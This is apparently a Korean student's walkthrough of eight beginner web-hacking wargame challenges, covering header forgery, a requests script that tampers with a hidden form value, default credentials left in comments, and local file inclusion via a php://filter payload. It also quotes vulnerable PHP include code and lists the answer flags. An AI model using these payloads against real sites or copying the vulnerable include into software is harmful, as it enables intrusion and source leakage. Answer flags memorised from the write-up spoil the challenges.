WEB HACKING
--------------
# 1. [Basic](http://wargame_sec.kongju.ac.kr/web/basic/prob.html)

먼저 들어가자마자보이는것은

*Find the flag this page*
*Flag Structure : flag is {real flag}*

이것인데 
이 뜻은  
이페이지 소스에서 __flag is {W3b_is_S1mp1e}__ 라는 것을 찾으라는 의미인것 같다 ~~사실 잘 모르...~~ 크흠...

- 그래서나는 이페이지의 소스를보고

         Find the flag this page</br>
         Flag Structure : flag is {real flag}
        <!--flag is {W3b_is_S1mp1e}-->

이것을 찾아냈다,

 여기서 __flag is {W3b_is_S1mp1e}__ <--이부분이 주석인 부분인데   

- 그래서 답은: **W3b_is_S1mp1e**
 
# 2.[Connect](http://wargame_sec.kongju.ac.kr/web/connect/prob.html)
이페이지에서 먼저 보이는 것은  

    Referer : wantconnection 

    User-Agent : iwant!!!!

라는것을 보내거나 수정하라는 것 같은데   ~~가아니라 기억이난다.~~

그래서나는 *Fiddler4*를 켜서 *raw* 에


    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36

    Referer: http://wargame_sec.kongju.ac.kr/web/connect/prob.html
 
 
 이코드를 찾았는데, 이코드에서 Refeler와 User-Agent 를 찾아서 바꾸면

     User-Agent: iwant!!!!
     Referer: wantconnection 

 fiddler 자체 웹뷰어에서
Key is Us3r_Ag3nt_@nd_R3f3r3r 라고 뜬다.

>user-agent는 사용자를 대신해서 인터넷에 접속하는 소프트웨어. 즉 브라우저다. ~~"ctrl+c, ctrl+v"~~

>리퍼러(referrer)는 웹 브라우저로 월드 와이드 웹을 서핑할 때, 하이퍼링크를 통해서 각각의 사이트로 방문시 남는 흔적을 말한다.
- 답: **Us3r_Ag3nt_@nd_R3f3r3r**

# 3.[Find](http://wargame_sec.kongju.ac.kr/web/find/prob.html)
맨 처음에 


1000점을 만들면 Flag가 나온다!
1000을 만들어 주세요!

[prob](linhttp://wargame_sec.kongju.ac.kr/web/find/prob.php)

가보이는데 prob에 들어가면 

    Prize - Point 1000 : Flag

    Your Point : 86
가보이고 
이페이지의 소스코드를 보면 
~~~py
<input type="hidden" name="HaHa" value="MA==">
~~~

이런게 보이는데 *hidden* 을 *submit* 으로 바꾸면  

~~~py
<input type="submit" name="HaHa" value="MA==">
~~~

*MA==* 이라는 botton 이 나타난다 . **여기서 MA== 뒤에 ==이들어가는 것으로 봐서 base64인것을 짐작할 수있다**

그래서 *MA==*을 base64 decode해봤더니 1이라는 값이 나왔다.

아무튼 이버튼을 누르면 

Your Point : 1으로 점이올라간다.

이점을 이용해 파이썬의 requests 모듈을 이용해보았다. ~~하경선배 감사합니다~~


```py
import requests
import base64

URL = 'http://wargame_sec.kongju.ac.kr/web/find/prob.php'
    response = requests.get(URL)

    for i in range(1,1000): #1000번 반복 
        point = base64.encodestring(str.encode(str(i)))[:-1] #base64 코드를 point로 저장 하지만 뒤 값은 null이기때문에 지운다.
        data = {'HaHa':point} #HaHa에 point 를 입력
        cookies = {'PHPSESSID' : 'v7mteq0os1qvh6imevk98uam31'} #identity 를 설정
        res = requests.post(URL,data=data, cookies=cookies) #url에 post
        print("attemp : {0}".format(i))

    print(res.text[:res.text.find('<body>')+100]) #html파일에 있는 코드중 <body>에서 다음 100줄까지 출력
```

그래서 이것을 실행해보면 100번째 쯤에서 막힌다 *웹에서 막는듯*

그래서 ~~노가다~~ for i in range(1,1000) 이 코드의 range 값을 맞추면서 개속하면 
결국

**Flag is W1nn3r_C0ngr4tur4t1on</br>Prize - Point 1000 : Flag</br>Your Point : 1000<form method='POST**
가 print 된다 

- 답: **W1nn3r_C0ngr4tur4t1on**

# 4.[Web1_Project3](http://wargame_sec.kongju.ac.kr/web/web1_DJU/index.php)
처음들어가면 관리자 로그인 페이지가 나오는데 소스코드를 보면
~~~html
<!--
	Test Account : admin/admin123
-->
~~~
이것을 찾을수 있는데  이것을 id는 admin pw는 admin123을 치면

Key is : Unc0mpleted_Devel0pment 가나온다.~~넘쉽다~~

- 답: **Unc0mpleted_Devel0pment**

# 5.[Web2_Project3](http://wargame_sec.kongju.ac.kr/web/web2_DJU/index.php)
들어가자마자 보이는것이 Plz POST me T.T 라고
보이는데 

*Fiddler* 로  *row*를 보면 

`GET http://wargame_sec.kongju.ac.kr/web/web2_DJU/index.php HTTP/1.1`

가보이는데 이GET을 POST로 바꾸면 
~~~html
<body>  KEY is : p0s7_m3_1f_y0u_can	</body>
~~~
가 나온다.

답:**p0s7_m3_1f_y0u_can**

# 6.[WEb3_Project3](http://wargame_sec.kongju.ac.kr/web/web3_DJU/index.php)
처음에 __이 페이지에서 이미 키를 드렸습니다.__ 라고 뜨는데 

키를 주었다니까 *Fiddler*를 켜서 보내는 쪽의*raw*를 보면 

`
Key: thisisKey
`

라고되어있다.

답:**thisisKey**

# 7.[Web4_Project3](http://wargame_sec.kongju.ac.kr/web/web4_DJU/index.php)
처음 들어가면 있어보이는 페이지가 나오는데

소스코드를보면 

~~~html
<!--<li><a href="?game=hint">hint</a></li>-->
~~~

이코드가 나오는데 주석을 제거하면 앵커가 생성된다
이곳에 들어가보면

Hint `<div class="content"> <?php include("./".$_GET["game"].".php"); ?> </div>`

LFI

라고나오는데 여기서 LFI는(Local File Inclusion)으로 로컬의 파일을 포함시킨다는 뜻이다.

위의 코드를 보면 php로 game의 값을 받는다는 것인데 SQL injection 을 해서 url에 /index.php?game=flag 를 쓰면
**Key is : L0cal_F1l3_1nclus10n!!** 가나온다.

답:**L0cal_F1l3_1nclus10n!**

# 8.[Web5_Project3](http://wargame_sec.kongju.ac.kr/web/web5_DJU/index.php)

처음에 ~~제환선배감사합니다~~
~~~html
<?php
  // Key is : *******************
?>
<html>
  <head>
    <title>web05</title>
  </head>
  <body>
    <h1>LFI (Local File Inclusion)</h1>
    <form method="get">
    <input type="text" name="url"/>
    <input type="submit">
    </form>
    <?php
      if(isset($_GET["url"]) && !empty($_GET["url"])){
        if(file_exists($_GET["url"])){
          include $_GET["url"];
        }else{
          echo "No File Exists!";
        }   
      }else if(isset($_GET["url"]) && empty($_GET["url"])){
        echo "Empty!";
      }   
    ?>  
  </body>
</html>
~~~
가나오는데
~~~html
<?php
  // Key is : *******************
?>
~~~

여기 php 소스가 주석처리되어있기 때문에 php 소스를 찾아야한다 

그래서 input에 

>php://filter/convert.base64_encode/resource 

이 함수를 이용해 

>php://filter/convert.base64-encode/resource=index.php

로 작성하니 
~~~
PD9waHAKCS8vIEtleSBpcyA6IExGSV9XSVRIX0JBU0U2NF9JU19WRVJZX0RBTkdFUk9VU18hCj8+CjxodG1sPgoJPGhlYWQ+CgkJPHRpdGxlPndlYjA1PC90aXRsZT4KCQk8c3R5bGU+CgkJCWh0bWwsIGJvZHl7CgkJCQl3aWR0aDogMTAwJTsKCQkJCW1hcmdpbjogMDsKCQkJCXBhZGRpbmc6IDA7CgkJCQl0ZXh0LWFsaWduOiBjZW50ZXI7CgkJCX0KCQkJYm9keXsKCQkJCW1hcmdpbi10b3A6IDQwcHg7CgkJCX0KCQkJLm91dHB1dHsKCQkJCXdpZHRoOiA4MDBweDsKCQkJCWhlaWdodDogMTIwcHggIWltcG9ydGFudDsKCQkJCWJvcmRlcjogMXB4IHNvbGlkICNhYWE7CgkJCQltYXJnaW46IDAgYXV0byAyMHB4IGF1dG87CgkJCQlvdmVyZmxvdy15OiBzY3JvbGw7CgkJCX0KCQkJLnNvdXJjZXsKCQkJCXdpZHRoOiA1MDRweDsKCQkJCW1hcmdpbjogMjBweCBhdXRvOwoJCQl9CgkJPC9zdHlsZT4KCTwvaGVhZD4KCTxib2R5PgoJCTxoMT5MRkkgKExvY2FsIEZpbGUgSW5jbHVzaW9uKTwvaDE+CgkJPGZvcm0gbWV0aG9kPSJnZXQiPgoJCTxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1cmwiLz4KCQk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVmlld0ZpbGUiPgoJCTwvZm9ybT4KCQk8ZGl2IGNsYXNzPSJvdXRwdXQiPgoJCQk8P3BocAoJCQkJaWYoaXNzZXQoJF9HRVRbInVybCJdKSAmJiAhZW1wdHkoJF9HRVRbInVybCJdKSl7CgkJCQkJJGVzY2FwZV9wYXR0ZXJuID0gYXJyYXkoImV0YyIsInBhc3N3ZCIsICJpbmkiLCAiJSIsICIvIik7CgkJCQkJaWYoaW5fYXJyYXkoJF9HRVRbInVybCJdLCAkZXNjYXBlX3BhdHRlcm4pKXsKCQkJCQkJZWNobyAiTm8gSGFja34hIjsKCQkJCQkJZXhpdDsKCQkJCQl9CgkJCQkJaWYoIWZpbGVfZXhpc3RzKCRfR0VUWyJ1cmwiXSkpewoJCQkJCQllY2hvICJObyBGaWxlIEV4aXN0cyFcbiI7CgkJCQkJfQoJCQkJCWluY2x1ZGUgJF9HRVRbInVybCJdOwoJCQkJfWVsc2UgaWYoaXNzZXQoJF9HRVRbInVybCJdKSAmJiBlbXB0eSgkX0dFVFsidXJsIl0pKXsKCQkJCQllY2hvICJFbXB0eSEiOwoJCQkJfQoJCQk/PgoJCTwvZGl2PgoJCTxocj4KCQk8ZGl2IGNsYXNzPSJzb3VyY2UiPgoJCQlpbmRleC5waHAgU09VUkNFPGJyIC8+CgkJCTw/cGhwCgkJCQlpbmNsdWRlICIuL3NvdXJjZS5odG1sIjsKCQkJPz4KCQk8L2Rpdj4KCTwvYm9keT4KPC9odG1sPgo=
~~~

이러한 어마어마한 문자열 이나오는데 맨 마지막에 '**=**' 이있는것으로 봐서 Base64인듯 하다 

그래서 python의 base64모듈을 사용하면,

~~~python
import base64
txt ="~~~" #위의 base64값

print(base64.b64decode(txt))

~~~

하니 
수많은 html코드중 

~~~
Key is : LFI_WITH_BASE64_IS_VERY_DANGEROUS_!
~~~

이값이 나왔다.

- 답:**LFI_WITH_BASE64_IS_VERY_DANGEROUS_!**
